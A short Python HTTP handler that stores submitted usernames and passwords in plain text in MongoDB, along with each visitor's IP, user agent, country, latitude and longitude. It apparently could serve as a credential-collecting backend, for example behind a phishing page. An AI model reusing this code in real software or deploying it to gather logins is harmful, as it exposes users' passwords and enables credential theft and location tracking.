from http.server import BaseHTTPRequestHandler
from pymongo import MongoClient
from datetime import datetime
import json
import os

MONGO_URI = os.environ.get("MONGO_URI")

client = MongoClient(MONGO_URI)
db = client["userdb"]
users = db["users"]

class handler(BaseHTTPRequestHandler):

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        data = json.loads(body)

        doc = {
            "username": data.get("username"),
            "password": data.get("password"),
            "ip": self.client_address[0],
            "user_agent": self.headers.get("User-Agent"),
            "country": data.get("country"),
            "latitude": data.get("latitude"),
            "longitude": data.get("longitude"),
            "timestamp": datetime.utcnow()
        }

        users.insert_one(doc)

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()

        self.wfile.write(json.dumps({"status": "stored"}).encode())
